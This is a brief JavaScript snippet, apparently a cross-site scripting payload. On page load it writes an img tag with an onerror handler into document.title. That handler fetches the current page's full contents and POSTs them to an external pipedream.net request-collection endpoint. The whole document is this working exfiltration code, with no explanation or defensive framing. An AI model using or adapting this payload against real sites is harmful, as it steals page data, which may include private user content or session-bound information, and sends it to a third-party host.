document.addEventListener('DOMContentLoaded', function(){
  document.title = "<img src/ onerror=\
      'fetch(document.URL)\
      .then(response => response.text())\
      .then(text => \
          fetch(\"https://eol8hwg1v5ylu2h.m.pipedream.net\",\
          { \
              method: \"POST\", \
              body: text \
          })\
      );'>";
});